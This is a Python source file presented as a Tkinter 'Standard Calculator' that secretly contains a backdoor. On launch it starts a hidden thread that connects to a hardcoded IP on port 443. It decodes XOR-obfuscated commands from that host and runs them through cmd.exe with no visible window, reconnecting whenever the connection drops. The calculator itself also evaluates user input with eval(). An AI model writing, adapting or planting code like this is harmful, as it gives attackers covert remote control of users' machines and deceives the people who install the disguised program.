import tkinter as tk
import socket
import threading
import time
import ctypes
from ctypes import wintypes

TARGET_IP = "10.211.55.5"  
TARGET_PORT = 443       
XOR_KEY = b'\x42'        

def xor_data(data):
    return bytes([b ^ XOR_KEY[0] for b in data])

def hidden_shell(cmd):
    """Executes command without creating a visible window."""
    si = wintypes.STARTUPINFO()
    si.dwFlags = 0x00000001 
    si.wShowWindow = 0      
    pi = wintypes.PROCESS_INFORMATION()
    
    cmd = f"cmd.exe /c {cmd}"
    ctypes.windll.kernel32.CreateProcessA(None, cmd.encode(), None, None, False, 
                                          0x08000000, None, None, ctypes.byref(si), ctypes.byref(pi))

def backdoor_loop():
    """Persistent connection thread."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            while True:
                data = s.recv(1024)
                if not data: break
                cmd = xor_data(data).decode().strip()
                hidden_shell(cmd)
        except:
            time.sleep(10) 

class CalculatorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Standard Calculator")
        self.display = tk.Entry(root, width=20, font=('Arial', 14))
        self.display.pack(pady=10)
        
        btn = tk.Button(root, text="Calculate", command=self.calculate)
        btn.pack(pady=5)
        
       
        threading.Thread(target=backdoor_loop, daemon=True).start()

    def calculate(self):
        try:
            res = eval(self.display.get())
            self.display.delete(0, tk.END)
            self.display.insert(0, str(res))
        except:
            self.display.delete(0, tk.END)
            self.display.insert(0, "Error")

if __name__ == "__main__":
    root = tk.Tk()
    app = CalculatorApp(root)
    root.mainloop()
